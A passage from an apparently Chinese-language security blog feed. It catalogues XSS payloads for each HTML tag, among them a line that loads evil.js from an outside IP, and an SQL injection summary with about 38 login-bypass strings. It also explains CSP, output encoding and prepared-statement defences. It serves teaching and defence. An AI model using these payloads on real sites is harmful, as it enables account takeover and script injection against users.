class="hljs-comment">;&gt;</span><br></code></pre></td></tr></table></figure><h5 id="svg-标签"><a href="#svg-标签" class="headerlink" title="svg 标签"></a><strong>svg 标签</strong></h5><p>​<code>&lt;svg&gt;</code>​标签用来在HTML页面中直接嵌入SVG 文件的代码。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;svg onload<span class="hljs-operator">=</span>alert(<span class="hljs-number">1</span>)<span class="hljs-comment">;&gt;</span><br></code></pre></td></tr></table></figure><h5 id="select-标签"><a href="#select-标签" class="headerlink" title="select 标签"></a><strong>select 标签</strong></h5><p>​<code>&lt;select&gt;</code>​标签用来创建下拉列表。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><br></code></pre></td></tr></table></figure><p>通过autofocus属性规定当页面加载时元素应该自动获得焦点，这个向量是使焦点自动跳到输入元素上，触发焦点事件，无需用户去触发：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">onfocus</span>=<span class="hljs-string">alert(1)</span> <span class="hljs-attr">autofocus</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="iframe-标签"><a href="#iframe-标签" class="headerlink" title="iframe 标签"></a><strong>iframe 标签</strong></h5><p>​<code>&lt;iframe&gt;</code>​标签会创建包含另外一个文档的内联框架。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">iframe</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">alert(1);</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">iframe</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="video-标签"><a href="#video-标签" class="headerlink" title="video 标签"></a><strong>video 标签</strong></h5><p>​<code>&lt;video&gt;</code>​标签定义视频，比如电影片段或其他视频流。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">video</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="audio-标签"><a href="#audio-标签" class="headerlink" title="audio 标签"></a><strong>audio 标签</strong></h5><p>​<code>&lt;audio&gt;</code>​标签定义声音，比如音乐或其他音频流。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;audio <span class="hljs-attribute">src</span>=x  <span class="hljs-attribute">onerror</span>=alert(1);&gt;<br></code></pre></td></tr></table></figure><h5 id="body-标签"><a href="#body-标签" class="headerlink" title="body 标签"></a><strong>body 标签</strong></h5><p>​<code>&lt;body&gt;</code>​标签定义文档的主体。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;body onload<span class="hljs-operator">=</span>alert(<span class="hljs-number">1</span>)<span class="hljs-comment">;&gt;</span><br></code></pre></td></tr></table></figure><p>onscroll 事件在元素滚动条在滚动时触发。我们可以利用换行符以及 autofocus，当用户滑动滚动条的时候自动触发，无需用户去点击触发：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;bodyonscroll=alert(1);&gt;</span><span class="hljs-section">&lt;br&gt;</span><br><span class="hljs-section">&lt;br&gt;</span><br><span class="hljs-section">&lt;br&gt;</span><br><span class="hljs-section">&lt;br&gt;</span><br><span class="hljs-section">&lt;br&gt;</span><br><span class="hljs-section">&lt;br&gt;</span><br><span class="hljs-section">&lt;br&gt;</span><br><span class="hljs-section">&lt;br&gt;</span><br><span class="hljs-section">&lt;br&gt;</span><br><span class="hljs-section">&lt;br&gt;</span><br><span class="hljs-section">&lt;br&gt;</span><br><span class="hljs-section">&lt;br&gt;</span><br><span class="hljs-section">&lt;br&gt;</span><br><span class="hljs-section">&lt;br&gt;</span><br><span class="hljs-section">&lt;br&gt;</span><br><span class="hljs-section">&lt;br&gt;</span><br><span class="hljs-section">&lt;br&gt;</span><br><span class="hljs-section">&lt;br&gt;</span><br><span class="hljs-section">&lt;br&gt;</span><br><span class="hljs-section">&lt;br&gt;</span><br><span class="hljs-section">&lt;br&gt;</span><br><span class="hljs-section">&lt;br&gt;</span><br><span class="hljs-section">&lt;br&gt;</span><br><span class="hljs-section">&lt;br&gt;</span><br><span class="hljs-section">&lt;br&gt;</span><br><span class="hljs-section">&lt;br&gt;</span><br><span class="hljs-section">&lt;br&gt;</span><br><span class="hljs-section">&lt;br&gt;</span><br><span class="hljs-section">&lt;br&gt;</span><br><span class="hljs-section">&lt;br&gt;</span><br><span class="hljs-section">&lt;br&gt;</span><br><span class="hljs-section">&lt;br&gt;</span><br><span class="hljs-section">&lt;br&gt;</span><br><span class="hljs-section">&lt;br&gt;</span><br><span class="hljs-section">&lt;br&gt;</span><br><span class="hljs-section">&lt;br&gt;</span><br><span class="hljs-section">&lt;br&gt;</span><br><span class="hljs-section">&lt;br&gt;</span><br><span class="hljs-section">&lt;br&gt;</span><br><span class="hljs-section">&lt;br&gt;</span><br><span class="hljs-section">&lt;input autofocus&gt;</span><br></code></pre></td></tr></table></figure><h5 id="textarea-标签"><a href="#textarea-标签" class="headerlink" title="textarea 标签"></a><strong>textarea 标签</strong></h5><p>​<code>&lt;textarea&gt;</code>​标签定义一个多行的文本输入控件。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;textarea onfocus<span class="hljs-operator">=</span>alert(<span class="hljs-number">1</span>)<span class="hljs-comment">; autofocus&gt;</span><br></code></pre></td></tr></table></figure><h5 id="keygen-标签"><a href="#keygen-标签" class="headerlink" title="keygen 标签"></a><strong>keygen 标签</strong></h5><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">&lt;keygen <span class="hljs-built_in">auto</span>focus onfocus=alert(<span class="hljs-number">1</span>)&gt; <span class="hljs-comment">//仅限火狐</span><br></code></pre></td></tr></table></figure><h5 id="marquee-标签"><a href="#marquee-标签" class="headerlink" title="marquee 标签"></a><strong>marquee 标签</strong></h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">marquee</span> <span class="hljs-attr">onstart</span>=<span class="hljs-string">alert(1)</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">marquee</span>&gt;</span> //Chrome不行，火狐和IE都可以<br></code></pre></td></tr></table></figure><h5 id="isindex-标签"><a href="#isindex-标签" class="headerlink" title="isindex 标签"></a><strong>isindex 标签</strong></h5><p>​<code>&lt;link&gt;</code>​标签定义文档与外部资源的关系。在无 CSP 的情况下才可以使用：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;link <span class="hljs-attribute">rel</span>=import <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;http://47.xxx.xxx.72/evil.js&quot;</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="4-DOM-型-XSS-的利用"><a href="#4-DOM-型-XSS-的利用" class="headerlink" title="4. DOM 型 XSS 的利用"></a>4. DOM 型 XSS 的利用</h3><blockquote><p>和前文说的一样，各种 js 中捣鼓</p></blockquote><h4 id="1-jQuery-中的-DOM-型-XSS"><a href="#1-jQuery-中的-DOM-型-XSS" class="headerlink" title="(1) jQuery 中的 DOM 型 XSS"></a>(1) jQuery 中的 DOM 型 XSS</h4><p>有问题的代码如下图所示</p><p><img src="/.com//image-20250519171416-tmigybk.png" alt="image"></p><p>若为进行任意过滤的时候 Payload</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=1 <span class="hljs-attribute">onerror</span>=alert(1)&gt;<br></code></pre></td></tr></table></figure><h4 id="2-利用遗留下的测试代码"><a href="#2-利用遗留下的测试代码" class="headerlink" title="(2) 利用遗留下的测试代码"></a>(2) 利用遗留下的测试代码</h4><p>不多扯了，详见 <a href="https://withd-raw.github.io/2022/05/05/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-07-XSS/#toc-heading-6">WebGoat代码审计-07-XSS 利用测试代码触发 DOM 型 XSS)</a></p><hr><h2 id="XSS-的实战应用"><a href="#XSS-的实战应用" class="headerlink" title="XSS 的实战应用"></a>XSS 的实战应用</h2><p>几种钓鱼，和 getshell<br><a href="https://xz.aliyun.com/t/8459">XSS 实战攻击思路总结</a><br><a href="https://www.hacking8.com/bug-web/Wordpress/Wordpress-%E7%B3%BB%E7%BB%9F%E6%BC%8F%E6%B4%9E/%E4%BB%8Exss%E5%88%B0getshell--xss%E7%9A%84%E6%B7%B1%E5%B1%82%E6%AC%A1%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8E%A2%E8%AE%A8.html">从xss到getshell–xss的深层次利用与探讨</a></p><hr><h2 id="CSRF-和-XSS-的区别"><a href="#CSRF-和-XSS-的区别" class="headerlink" title="CSRF 和 XSS 的区别"></a>CSRF 和 XSS 的区别</h2><p>1、CSRF是<strong>跨站请求伪造;</strong>   XSS是<strong>跨域脚本攻击</strong>。<br>2、CSRF需要用户先<strong>登录网站A,获取cookie;</strong>   XSS<strong>不需要登录</strong>。<br>3、CSRF是利用网站<strong>A本身的漏洞</strong>,去请<strong>求网站A的api;</strong>   XSS是向网站<strong>A注入JS代码</strong>,然后<strong>执行JS里的代码</strong>,<strong>篡改网站A的内容</strong>。（XSS利用的是<strong>站点内的信任用户</strong>，而CSRF则是<strong>通过伪装来自受信任用户的请求</strong>来<strong>利用受信任的网站</strong>。你可以这么理解CSRF攻击：<strong>攻击者盗用了你的身份，以你的名义向第三方网站发送恶意请求</strong>。）</p><hr><h2 id="XSS-的防御"><a href="#XSS-的防御" class="headerlink" title="XSS 的防御"></a>XSS 的防御</h2><ul><li>主要是两层：<br>一： 对输出端的<strong>数据进行编码</strong><br>二: <strong>验证输入</strong></li></ul><p>目前时间 2022 年 5 月，感觉 XSS 不像之前那么泛滥了。</p><h3 id="1-对输出端的数据进行编码"><a href="#1-对输出端的数据进行编码" class="headerlink" title="1. 对输出端的数据进行编码"></a>1. 对输出端的数据进行编码</h3><p>1）将一些<strong>字符进行转义</strong>，例如<code>&lt;</code>​，<code>&gt;</code>​进行转义<br>2）白名单，通过一些<strong>标签限制</strong><br>3）不要把<strong>后端传进来的数据</strong>直接作为 <strong>HTML 渲染</strong>，进行处理</p><h3 id="2-CSP-的应用"><a href="#2-CSP-的应用" class="headerlink" title="2. CSP 的应用"></a>2. CSP 的应用</h3><p>严格的 CSP 在 XSS 的防范中可以起到以下的作用：</p><ul><li><strong>禁止加载外域代码</strong>，防止复杂的攻击逻辑。</li><li><strong>禁止内联脚本执行</strong>。</li><li><strong>禁止外域提交</strong>，网站被攻击后，用户的数据不会泄露到外域。</li><li>合理使用上报可以及时发现 XSS，利于尽快修复问题。</li></ul><h3 id="3-其他安全措施"><a href="#3-其他安全措施" class="headerlink" title="3. 其他安全措施"></a>3. 其他安全措施</h3><ul><li><strong>HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie</strong>，攻击者完成 <strong>XSS 注入</strong>后也无法<strong>窃取此 Cookie</strong>。</li><li><strong>验证码：</strong> 防止脚本冒充用户提交危险操作。</li></ul>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
      <category>XSS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>XSS</tag>
      
      <tag>安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入总结</title>
    <link href="/2024/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
    <url>/2024/05/20/Web/%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/SQL%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="sql注入总结"><a href="#sql注入总结" class="headerlink" title="sql注入总结"></a>sql注入总结</h1><h2 id="什么是-Sql-注入？"><a href="#什么是-Sql-注入？" class="headerlink" title="什么是 Sql 注入？"></a>什么是 Sql 注入？</h2><p>SQL 注入是比较常见的网络攻击方式之一，它不是利用操作系统的 BUG 来实现攻击，而是针对程序员编写时的疏忽，通过 SQL 语句，实现无账号登录，甚至篡改数据库。</p><p>由于以下的环境都是 MySQL 数据库，所以先了解点 MySQL 有关的知识。在 MySQL5.0 之后，MySQL 中默认添加了一个名为<code>information_schema</code>​的数据库，<u>该数据库中的表都是</u>​<u><strong>只读的</strong></u>​<u>，不能进行更新、删除和插入等操作，也不能加载触发器，因为它们实际只是一个</u>​<u><strong>视图</strong></u>​<u>，不是</u>​<u><strong>基本表</strong></u>​<u>，</u>​<u><strong>没有关联的文件</strong></u>​<u>。</u></p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean">mysql中注释符：#   、<span class="hljs-comment">/**/</span> 、  --<br></code></pre></td></tr></table></figure><h4 id="information-schema-中三个很重要的表："><a href="#information-schema-中三个很重要的表：" class="headerlink" title="information_schema 中三个很重要的表："></a>information_schema 中三个很重要的表：</h4><ul><li>information_schema.<strong>schemata</strong>: 该数据表存储了 mysql 数据库中的所有数据库的<code>库名</code>​</li><li>information_schema.<strong>tables</strong>： 该数据表存储了 mysql 数据库中的所有数据表的<code>表名</code>​</li><li>information_schema.<strong>columns</strong>: 该数据表存储了 mysql 数据库中的所有列的<code>列名</code>​</li></ul><h2 id="Mysql-中常用的函数"><a href="#Mysql-中常用的函数" class="headerlink" title="Mysql 中常用的函数"></a>Mysql 中常用的函数</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">version():查询数据库的版本<br>user():查询数据库的使用者<br>database():数据库<br>system_user():系统用户名<br>session_user():连接数据库的用户名<br>current_user():当前用户名<br>load_file():读取本地文件<br>@@datadir:读取数据库路径<br>@@basedir:mysql安装路径<br>@@version_complie_os:查看操作系统<br></code></pre></td></tr></table></figure><hr><h2 id="判断-SQL-注入是否存在"><a href="#判断-SQL-注入是否存在" class="headerlink" title="判断 SQL 注入是否存在"></a>判断 SQL 注入是否存在</h2><ul><li>先加单引号<code>&#39;</code>​、双引号<code>&quot;</code>​、单括号<code>)</code>​、双括号<code>))</code>​等看看是否<strong>报错</strong>，如果报错就可能存在 SQL 注入漏洞了。</li><li>还有在 URL 后面加<code>and 1 = 1 、 and 1 = 2</code>​看页面是否显示一样，<strong>显示不一样</strong>的话，肯定存在 SQL 注入漏洞了。</li><li>还有就是<code>Timing Attack</code>​测试，也就是<code>时间盲注</code>​。有时候通过简单的条件语句比如 <strong>and 1&#x3D;2</strong> 是无法看出异常的。</li><li>在 MySQL 中，有一个<code>Benchmark()</code>​函数，它是用于<strong>测试性能</strong>的。<u>Benchmark(count,expr)，这个函数执行的结果，是将</u>​<u><strong>表达式expr执行count次</strong></u>​<u> 。</u></li></ul><p>因此，利用<code>benchmark函数</code>​，<u>可以让</u>​<u><strong>同一个函数执行若干次</strong></u>​<u>，使得结果返回的时间比平时要长，通过</u>​<u><strong>时间长短</strong></u>​<u>的变化，可以判断注入语句是否执行成功。</u>这是一种<strong>边信道攻击</strong>，这个技巧在盲注中被称为<code>Timing Attack</code>​，也就是<code>时间盲注</code>​。</p><p><strong>易出现 SQL 注入的功能点：</strong> 凡是和<code>数据库有交互</code>​的地方都容易出现 SQL 注入，SQL 注入经常出现在登陆页面、涉及获取 HTTP 头（<strong>user-agent &#x2F; client-ip</strong> 等）的功能点及订单处理等地方。例如登陆页面，除常见的万能密码，post 数据注入外也有可能发生在 HTTP 头中的 <strong>client-ip</strong> 和 <strong>x-forward-for</strong> 等字段处。这些字段是用来记录<strong>登陆的 ip</strong> 的，有可能会被<strong>存储进数据库</strong>中从而与数据库发生交互导致 sql 注入。</p><h2 id="Sql-注入的分类"><a href="#Sql-注入的分类" class="headerlink" title="Sql 注入的分类"></a>Sql 注入的分类</h2><hr><table><thead><tr><th>分类依据</th><th>类型</th></tr></thead><tbody><tr><td>获取信息的方式</td><td>布尔盲注，时间盲注，报错注入 ，union查询注入，堆叠注入等</td></tr><tr><td>提交方式</td><td>GET、POST、COOKIE、HTTP 注入等</td></tr><tr><td>注入点类型</td><td>数字类型的注入、字符串类型的注入、搜索型注入等</td></tr><tr><td>其他注入</td><td>二次注入、User-Agent 注入、文件读写、宽字节注入 、万能密码 等</td></tr></tbody></table><hr><h2 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>原验证登陆语句:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">admin</span> <span class="hljs-keyword">WHERE</span> Username= <span class="hljs-string">&#x27;&quot;.$username.&quot;&#x27;</span> <span class="hljs-keyword">AND</span> <span class="hljs-keyword">Password</span>= <span class="hljs-string">&#x27;&quot;.md5($password).&quot;&#x27;</span><br></code></pre></td></tr></table></figure><p>输入<code>1&#39; or 1=1 or &#39;1&#39;=&#39;1</code>​万能密码语句变为:</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">admin</span> <span class="hljs-keyword">WHERE</span> Username=<span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">OR</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">OR</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">AND</span> <span class="hljs-keyword">Password</span>=<span class="hljs-string">&#x27;EDFKGMZDFSDFDSFRRQWERRFGGG&#x27;</span><br></code></pre></td></tr></table></figure><p>即得到优先级关系：<code>or&lt;and&lt;not</code>​，同一优先级默认从左往右计算。</p><ul><li>上面<code>&#39;1&#39;=&#39;1&#39; AND Password=&#39;EDFKGMZDFSDFDSFRRQWERRFGGG&#39;</code>​<strong>先计算</strong>肯定返回<code>false</code>​,因为密码是我们乱输入的。(此处是假)</li><li>Username=‘1’ 返回假，数据库没有1这个用户名(此处是假)</li><li>1=1返回真(此处是真)</li></ul><p>以上的结果是:<code>假 or 真 or假</code>​返回<code>真</code>​。验证通过。再比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> tel,<span class="hljs-built_in">pwd</span> <span class="hljs-built_in">where</span> tel=<span class="hljs-string">&#x27;111&#x27;</span> and <span class="hljs-built_in">pwd</span>=<span class="hljs-string">&#x27;123456&#x27;</span><br></code></pre></td></tr></table></figure><p>我们把电话111看成一个变量，输入电话号码为<code>&#39; or 1= &#39;1</code>​。</p><p>sql就变为如下样子：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span>  tel,<span class="hljs-built_in">pwd</span> <span class="hljs-built_in">where</span> tel=<span class="hljs-string">&#x27;&#x27;</span> or 1=<span class="hljs-string">&#x27;1&#x27;</span> and <span class="hljs-built_in">pwd</span>=<span class="hljs-string">&#x27;123456&#x27;</span><br></code></pre></td></tr></table></figure><ul><li>上面<code>1=&#39;1&#39; and pwd=&#39;123456&#39;</code>​<strong>先计算</strong>肯定返回<code>false</code>​。(此处是假)</li><li>tel=‘’ 返回假，数据库没有<code>&#39;&#39;</code>​这个手机号。(此处是假)</li></ul><p>以上的结果是:<code>真 or假</code>​返回<code>真</code>​。验证通过。</p><h3 id="常用的万能密码"><a href="#常用的万能密码" class="headerlink" title="常用的万能密码"></a>常用的万能密码</h3><hr><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-string">&#x27; or 1=&#x27;</span>1<br><span class="hljs-string">&#x27;or&#x27;</span>=<span class="hljs-string">&#x27;or&#x27;</span><br>admin<br>admin<span class="hljs-string">&#x27;--</span><br><span class="hljs-string">admin&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-attribute">4</span>=4--<br>admin<span class="hljs-string">&#x27; or &#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>1<span class="hljs-string">&#x27;--</span><br><span class="hljs-string">admin888</span><br><span class="hljs-string">&quot;or &quot;a&quot;=&quot;a</span><br><span class="hljs-string">admin&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-attribute">2</span>=2#<br>a<span class="hljs-string">&#x27; having 1=1#</span><br><span class="hljs-string">a&#x27;</span> having <span class="hljs-attribute">1</span>=1--<br>admin<span class="hljs-string">&#x27; or &#x27;</span>2<span class="hljs-string">&#x27;=&#x27;</span>2<br><span class="hljs-string">&#x27;)or(&#x27;</span>a<span class="hljs-string">&#x27;=&#x27;</span>a<br><span class="hljs-keyword">or</span> <span class="hljs-attribute">4</span>=4--<br>c<br>a<span class="hljs-string">&#x27;or&#x27;</span> <span class="hljs-attribute">4</span>=4--<br><span class="hljs-string">&quot;or 4=4--</span><br><span class="hljs-string">&#x27;or&#x27;a&#x27;=&#x27;a</span><br><span class="hljs-string">&quot;</span><span class="hljs-keyword">or</span><span class="hljs-string">&quot;=&quot;</span>a<span class="hljs-string">&#x27;=&#x27;</span>a<br><span class="hljs-string">&#x27;or&#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br><span class="hljs-string">&#x27;or&#x27;</span>=<span class="hljs-string">&#x27;or&#x27;</span><br>1 <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span>=1<br>1 <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-attribute">4</span>=4<br><span class="hljs-string">&#x27;OR 4=4%00</span><br><span class="hljs-string">&quot;or 4=4%00</span><br><span class="hljs-string">&#x27;</span>xor<br>admin<span class="hljs-string">&#x27; UNION Select 1,1,1 FROM admin Where &#x27;</span><span class="hljs-string">&#x27;=&#x27;</span><br>1<br>-1%cf<span class="hljs-string">&#x27; union select 1,1,1 as password,1,1,1 %23</span><br><span class="hljs-string">1</span><br><span class="hljs-string">17..admin&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;a&#x27;</span>=<span class="hljs-string">&#x27;a 密码随便</span><br><span class="hljs-string">&#x27;</span><span class="hljs-keyword">or</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-keyword">or</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">&#x27;</span><span class="hljs-keyword">or</span> <span class="hljs-attribute">4</span>=4/*<br>something<br><span class="hljs-string">&#x27; OR &#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>1<br>1<span class="hljs-string">&#x27;or&#x27;</span>1<span class="hljs-string">&#x27;=&#x27;</span>1<br>admin<span class="hljs-string">&#x27; OR 4=4/*</span><br><span class="hljs-string">1&#x27;</span><span class="hljs-keyword">or</span><span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span><br></code></pre></td></tr></table></figure><hr><h2 id="Sql-注入的预防"><a href="#Sql-注入的预防" class="headerlink" title="Sql 注入的预防"></a>Sql 注入的预防</h2><p><u>一般在项目中我们不太会去注意 SQL 注入的问题</u>，因为我们会使用 <strong>ORM</strong>，而 ORM 在实现的过程中也会帮我做 SQL 注入过滤；但有的时候 ORM 没法满足我们的需求，这时可能就会手撸原生 SQL 来执行</p><h3 id="预编译-PreparedStatement-JSP"><a href="#预编译-PreparedStatement-JSP" class="headerlink" title="预编译(PreparedStatement)(JSP)"></a>预编译(PreparedStatement)(JSP)</h3><hr><p>可以采用预编译语句集，它内置了处理SQL注入的能力，只要使用它的setXXX方法传值即可。</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">String sql = &quot;<span class="hljs-keyword">select</span> id, no <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id=?<span class="hljs-string">&quot;;</span><br><span class="hljs-string">PreparedStatement ps = conn.prepareStatement(sql);</span><br><span class="hljs-string">ps.setInt(1, id);</span><br><span class="hljs-string">ps.executeQuery();</span><br></code></pre></td></tr></table></figure><p>如上所示，就是典型的采用 SQL语句预编译来防止SQL注入 。为什么这样就可以防止SQL注入呢？</p><p>其原因就是：采用了PreparedStatement预编译，就会将SQL语句：”select id, no from user where id=?” 预先编译好，也就是SQL引擎会预先进行语法分析，产生语法树，生成执行计划，也就是说，后面你输入的参数，无论你输入的是什么，都不会<strong>影响该SQL语句的语法结构了</strong>，因为<strong>语法分析已经完成了</strong>，而语法分析<strong>主要是分析SQL命令</strong>，比如 select、from 、where 、and、 or 、order by 等等。所以即使你后面<strong>输入了这些SQL命令</strong>，<strong>也不会被当成SQL命令来执行了</strong>，因为这些SQL命令的执行， 必须先通过<strong>语法分析</strong>，生成<strong>执行计划</strong>，既然语法分析已经完成，已经预编译过了，那么后面输入的参数，是绝对不可能作为SQL命令来执行的，只会被当做字符串字面值参数。所以SQL语句<strong>预编译</strong>可以有效防御SQL注入。</p><p>原理：SQL注入只对SQL语句的编译过程有破坏作用，而PreparedStatement已经预编译好了，执行阶段只是把输入串作为数据处理。而不再对SQL语句进行解析。因此也就避免了sql注入问题。</p><h3 id="PDO（PHP）"><a href="#PDO（PHP）" class="headerlink" title="PDO（PHP）"></a>PDO（PHP）</h3><p>首先简单介绍一下什么是<strong>PDO</strong>。PDO是PHP Data Objects（php数据对象）的缩写。是在php5.1版本之后开始支持PDO。你可以把PDO看做是php提供的一个类。它提供了一组<strong>数据库抽象层</strong>API，使得编写php代码不再关心具体要连接的数据库类型。你既可以用使用PDO连接mysql，也可以用它连接oracle。并且PDO很好的解决了sql注入问题。</p><p>PDO对于解决SQL注入的原理也是<strong>基于预编译</strong>。</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs haskell">$<span class="hljs-class"><span class="hljs-keyword">data</span> = $db-&gt;prepare( &#x27;<span class="hljs-type">SELECT</span> <span class="hljs-title">first_name</span>, <span class="hljs-title">last_name</span> <span class="hljs-type">FROM</span> <span class="hljs-title">users</span> <span 